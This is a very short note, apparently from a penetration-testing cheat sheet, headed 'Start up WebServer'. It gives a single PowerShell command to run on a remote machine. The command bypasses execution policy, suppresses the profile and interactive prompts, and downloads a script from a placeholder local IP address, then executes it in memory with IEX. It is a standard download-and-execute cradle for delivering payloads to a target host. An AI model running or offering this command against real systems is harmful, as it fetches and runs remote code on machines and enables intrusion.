## Start up WebServer

#Run on remote machine to download scripts from server
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>/helloworld.ps1'))
